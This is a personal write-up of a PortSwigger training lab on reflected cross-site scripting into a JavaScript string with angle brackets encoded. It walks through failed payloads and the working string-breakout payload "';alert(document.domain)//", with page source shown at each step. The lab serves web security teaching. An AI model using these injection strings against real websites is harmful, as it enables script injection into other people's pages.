# Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded), you'll learn: Reflected XSS into a JavaScript string with angle brackets HTML encoded! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229071233.png)

In here, we can there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229071314.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229071330.png)

As you can see, our input is reflected to the web page.

**Let's try to inject a JavaScript code that calls function `alert()`:**
```html
<script>alert(document.domain)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229071433.png)

**View source page:**
```html
<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;alert(document.domain)&lt;/script&gt;'</h1>
    <hr>
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
<script>
    var searchTerms = '&lt;script&gt;alert(document.domain)&lt;/script&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

In here, we can see that our `<>` were HTML encoded.

Also, **our input is being parsed to the `document.write`.**

**Let's try to break that JavaScript string:**
```html
'" onload=alert(document.domain) close="
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229072054.png)

**View source page:**
```html
<section class=blog-header>
    <h1>0 search results for '&apos;&quot; onload=alert(document.domain) close=&quot;'</h1>
    <hr>
</section>
```

Hmm... **Looks like we can't use `<>'"`.**

**To breaking out of a string literal, we can use:**
```js
';alert(document.domain)//
```

The `';` is to end the string and the current JavaScript line, then the `//` is to commented out the reset of the JavaScript code.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229072351.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-9/images/Pasted%20image%2020221229072358.png)

We did it!

# What we've learned:

1. Reflected XSS into a JavaScript string with angle brackets HTML encoded